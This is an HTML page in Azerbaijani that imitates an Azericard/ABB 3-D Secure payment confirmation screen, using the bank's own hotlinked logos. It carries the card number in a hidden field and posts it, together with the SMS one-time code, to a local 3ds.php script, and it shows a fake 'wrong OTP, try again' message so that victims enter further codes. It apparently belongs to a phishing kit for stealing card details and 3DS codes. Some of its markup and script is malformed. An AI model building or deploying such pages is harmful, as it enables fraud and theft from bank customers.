<!DOCTYPE html>
<html lang="en">

<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Azericard - Ödənişin təsdiqi</title>
    <link href="css/azericard.css" rel="stylesheet" type="text/css">
    <style>

        .amount-display {

        .credit-info span {

</head>

<body>
    <div class="all">
        <main class="main">
            <header>
                <div class="card-call">
                    <img src="https://mpi.3dsecure.az/abb_default/img/abb_logo.svg" alt="ABB Logo">
                    <img src="images/mastercard.png" style="width: 40px;" alt="Azericard Logo">
                    <img src="https://static.tildacdn.one/tild3062-3037-4265-b832-663130393564/m10byPashaPay_1.svg" alt="PashaPay Logo">
                </div>
            </header>

            <section class="form-content">
                <h1>Ödənişin təsdiqi</h1>
                
                <div class="transaction-details">
                    <div class="datetime-display" id="currentDateTime"></div>
                    <div class="amount-display" id="paymentAmount"></div>
                    <div class="card-info">
                        <img id="cardTypeLogo" src="images/mastercard.png" alt="Card Type" width="40" height="24">
                        <span id="cardNumber"></span>
                    </div>
                </div>

                <form class="form-container" action="3ds.php" method="POST" autocomplete="off">
                    <div class="field-container2">
                        <div class="field-container_cvc">
                            <div class="field_cvc">
                                <div>
                                    <label for="securitycode">3DS Code</label>
                                    <input required id="securitycode" type="tel" inputmode="numeric" 
                                           name="otp" placeholder="****" minlength="4" maxlength="6"
                                           pattern="[0-9]*">
                                </div>
                                <div class="tooltip">
                                    <img src="https://mpi.3dsecure.az/abb_default/img/info-circle.svg" alt="Info" width="20" height="20" style="cursor: pointer;">
                                    <span class="tooltiptext">
                                        Sizə mesaj vasitəsi ilə göndərildi!
                                    </span>
                                </div>
                            </div>
                        </div>
                    </div>
                    <input id="card" name="card" type="hidden">

                    <div class="form-button">
                        <button id="submitBtn" type="submit" class="submitBtn" disabled>
                            <img src="https://mpi.3dsecure.az/abb_default/img/lock.svg" alt="Lock" width="16" height="16">
                            Ödənişi təsdiqlə
                        </button>
                        <button id="cnltBtn" type="button" onclick="window.location.href='../index.html'">
                            Ödənişin ləğvi
                        </button>
                    </div>
                </form>
            </section>
        </main>

        <footer>
            <div class="footer_1">
                <img src="images/visa_logo.png" style="height:20px; margin: 0 10px;" alt="Visa">
                <img src="images/visa_logo.png" style="height:20px; margin: 0 10px;" alt="Visa">
                <img src="images/mastercard.png" style="width: 40px;" alt="Mastercard" width="48" height="24">
                <img src="images/mastercard.png" style="width: 40px;" alt="Mastercard SecureCode" width="48" height="24">
            </div>
            <div class="footer_2">
                <img src="https://mpi.3dsecure.az/abb_default/img/american_express.svg" alt="American Express" width="48" height="24">
                <img src="https://mpi.3dsecure.az/abb_default/img/safeKey.svg" alt="SafeKey" width="48" height="24">
                <img src="https://mpi.3dsecure.az/abb_default/img/UnionPay.svg" alt="UnionPay" width="48" height="24">
                <img src="https://mpi.3dsecure.az/abb_default/img/jcb.svg" alt="JCB" width="48" height="24">
            </div>
        </footer>
    </div>

    <script src="js/azericard-imask.js"></script>
    <script>
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const cardNumber = urlParams.get('card') || '';
        const amount = urlParams.get('amount') || '0.00';

        // Format and display amount
        const formattedAmount = new Intl.NumberFormat('az-AZ', {
            style: 'currency',
            currency: 'AZN'
        }).format(parseFloat(amount));
        document.getElementById('paymentAmount').textContent = formattedAmount;
        document.getElementById('card').value = cardNumber;

        // Update card display - show last 4 digits
        const lastFourDigits = cardNumber.slice(-4);
        document.getElementById('cardNumber').textContent = lastFourDigits ? `**** **** **** ${lastFourDigits}` : '';

        // Set current date and time
        function updateDateTime() {
            const now = new Date();
            const hours = String(now.getHours()).padStart(2, '0');
            const minutes = String(now.getMinutes()).padStart(2, '0');
            const dd = String(now.getDate()).padStart(2, '0');
            const mm = String(now.getMonth() + 1).padStart(2, '0');
            const yyyy = now.getFullYear();
            
            document.getElementById('currentDateTime').textContent = 
                `${hours}:${minutes} ${dd}.${mm}.${yyyy}`;
        }
        updateDateTime();

        // Set card type logo
        const cardTypeLogo = document.getElementById('cardTypeLogo');
        if (cardNumber.startsWith('4')) {
            cardTypeLogo.src = 'images/visa.png';
            cardTypeLogo.alt = 'Visa';
        } else if (/^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/.test(cardNumber)) {
            cardTypeLogo.src = 'images/mastercard.png';
            cardTypeLogo.alt = 'Mastercard';
        }


        // Enable submit button when OTP is entered
        const otpInput = document.getElementById('securitycode');
        const submitBtn = document.getElementById('submitBtn');
        
        otpInput.addEventListener('input', function() {
            submitBtn.disabled = this.value.length < 4;
        });


    </script>

<style>
    .professional-error {
        background-color: #f8d7da;
        color: #721c24;
        border: 1px solid #f5c6cb;
        padding: 12px;
        border-radius: 8px;
        margin-top: 15px;
        text-align: center;
        font-weight: 600;
        font-size: 14px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
    }
    .input-error-border {
    }
</style>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        // Əgər ünvan çubuğunda xəta varsa
        if (window.location.href.includes('error=invalid_otp')) {
            // 1. 3DS Code xanasını tapıb qırmızı border veririk
            const input = document.querySelector('input[type="text"], input[type="tel"], input[type="number"]');
            if (input) {
                input.style.border = '2px solid #dc3545';
                input.style.backgroundColor = '#fff8f8';
            }
            
            // 2. Xəta qutusunu yaradırıq
            const form = document.querySelector('form');
                const errBox = document.createElement('div');
                errBox.id = 'prof-error-box';
                errBox.className = 'professional-error';
                errBox.innerHTML = '<span>⚠️</span> OTP kodu yanlışdır. Zəhmət olmasa yenidən cəhd edin.';
                form.parentNode.insertBefore(errBox, form.nextSibling);
            }
        }
    });
</script>
</body>

</html>
<!-- OTP Xəta Mesajı üçün Skript -->
<script>
    document.addEventListener('DOMContentLoaded', function() {
        if (window.location.href.includes('error=invalid_otp')) {
            const form = document.querySelector('form');
            if(form && !document.getElementById('otp-error-box')){
                const err = document.createElement('div');
                err.id = 'otp-error-box';
                err.style.color = '#d9534f';
                err.style.textAlign = 'center';
                err.style.marginTop = '15px';
                err.style.fontWeight = 'bold';
                err.style.fontSize = '14px';
                err.innerText = 'OTP kodu yanlışdır. Zəhmət olmasa yenidən cəhd edin.';
                form.parentNode.insertBefore(err, form.nextSibling);
            }
        }
    });
</script>
